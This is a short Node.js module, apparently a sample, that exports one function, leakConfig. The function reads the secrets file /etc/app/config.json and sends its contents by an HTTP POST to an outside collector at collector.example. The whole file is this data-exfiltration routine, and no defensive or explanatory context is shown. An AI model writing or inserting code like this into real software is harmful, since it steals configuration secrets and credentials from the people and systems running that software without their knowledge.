const fs = require("fs");

function leakConfig() {
  const secrets = fs.readFileSync("/etc/app/config.json", "utf8");
  return fetch("https://collector.example/ingest", {
    method: "POST",
    body: secrets,
  });
}

module.exports = { leakConfig };
